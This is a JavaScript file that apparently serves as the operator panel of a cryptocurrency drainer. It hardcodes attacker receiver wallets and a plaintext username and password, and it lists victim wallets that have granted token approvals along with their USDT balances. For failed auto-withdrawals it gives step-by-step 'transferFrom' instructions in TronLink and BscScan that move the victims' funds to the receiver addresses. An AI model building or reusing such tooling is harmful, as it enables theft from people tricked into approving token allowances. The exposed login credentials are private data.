const TRC_RECEIVER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
const BEP_RECEIVER = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";

const credentials = {
  username: "enre.atul",
  password: "Honda988701@"
};

const sampleData = {
  trc20: [
    { address: "TABC12345abcde6789XYZ", amount: 500, approved: true, autoWithdraw: false },
    { address: "TXYZ45678pqrs1234LMN", amount: 140, approved: true, autoWithdraw: true }
  ],
  bep20: [
    { address: "0xabc12345def67890abc123456789abcd12345678", amount: 340, approved: true, autoWithdraw: false }
  ]
};

function login() {
  const u = document.getElementById("username").value;
  const p = document.getElementById("password").value;

  if (u === credentials.username && p === credentials.password) {
    document.getElementById("loginBox").style.display = "none";
    document.getElementById("mainPanel").style.display = "block";
    loadLogs();
  } else {
    alert("Incorrect credentials");
  }
}

function loadLogs() {
  const trcLogs = document.getElementById("trcLogs");
  const bepLogs = document.getElementById("bepLogs");

  sampleData.trc20.forEach(wallet => {
    if (wallet.approved) {
      const div = document.createElement("div");
      div.className = "wallet-log";
      div.innerHTML = `
        <strong>Wallet:</strong> ${wallet.address}<br>
        <strong>Balance:</strong> ${wallet.amount} USDT<br>
        <strong>Approved:</strong> ✅<br>
        <strong>Auto Withdraw:</strong> ${wallet.autoWithdraw ? "✅ Success" : "❌ Failed"}<br>
        ${wallet.autoWithdraw ? "" : `<button onclick="manualWithdraw('${wallet.address}', ${wallet.amount}, 'TRC')">Withdraw Manually</button>`}
      `;
      trcLogs.appendChild(div);
    }
  });

  sampleData.bep20.forEach(wallet => {
    if (wallet.approved) {
      const div = document.createElement("div");
      div.className = "wallet-log";
      div.innerHTML = `
        <strong>Wallet:</strong> ${wallet.address}<br>
        <strong>Balance:</strong> ${wallet.amount} USDT<br>
        <strong>Approved:</strong> ✅<br>
        <strong>Auto Withdraw:</strong> ${wallet.autoWithdraw ? "✅ Success" : "❌ Failed"}<br>
        ${wallet.autoWithdraw ? "" : `<button onclick="manualWithdraw('${wallet.address}', ${wallet.amount}, 'BEP')">Withdraw Manually</button>`}
      `;
      bepLogs.appendChild(div);
    }
  });
}

function manualWithdraw(fromAddress, amount, chain) {
  let message = `To manually withdraw ${amount} USDT from:\n\n${fromAddress}\n\nto your wallet:\n\n`;

  message += chain === "TRC"
    ? `${TRC_RECEIVER}\n\n1. Open TronLink\n2. Go to USDT (TRC-20)\n3. Use "transferFrom" to send from user's address`
    : `${BEP_RECEIVER}\n\n1. Open BscScan (Write Contract tab)\n2. Connect Wallet (MetaMask/SafePal)\n3. Use "transferFrom"\n4. From: ${fromAddress}\nTo: ${BEP_RECEIVER}\nAmount: ${amount * 1e18}`;

  alert(message);
}
